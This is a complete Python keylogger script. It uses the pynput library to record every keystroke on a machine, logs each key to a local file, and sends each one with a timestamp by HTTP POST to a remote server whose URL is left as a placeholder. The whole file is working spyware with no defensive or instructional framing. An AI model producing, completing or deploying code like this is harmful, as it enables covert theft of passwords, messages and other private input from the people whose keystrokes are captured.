import logging
from pynput import keyboard
import requests
from datetime import datetime

# Configure logging to capture keystrokes in a log file
logging.basicConfig(filename="keystrokes.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Server URL where data will be sent
SERVER_URL = "Enter your actual server url"  # Replace with your server's actual URL

# Function to send data to the server
def send_data_to_server(data):
    try:
        response = requests.post(SERVER_URL, json=data)
        if response.status_code == 200:
            logging.info("Data successfully sent to server")
        else:
            logging.error(f"Failed to send data: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending data: {e}")

# Function to handle key presses
def on_press(key):
    try:
        # Detect special keys and regular keys
        if hasattr(key, 'char') and key.char is not None:
            key_value = key.char  # Regular keys
        else:
            key_value = str(key)  # Special keys (e.g., Ctrl, Shift, etc.)

        # Log the keystroke to a local file
        logging.info(f"Key pressed: {key_value}")
        
        # Send the keystroke data to the server
        send_data_to_server({
            "key": key_value,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
    
    except Exception as e:
        logging.error(f"Error processing key press: {e}")

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    logging.info("Keystroke logging started.")
    listener.join()  # Keep listening for key presses


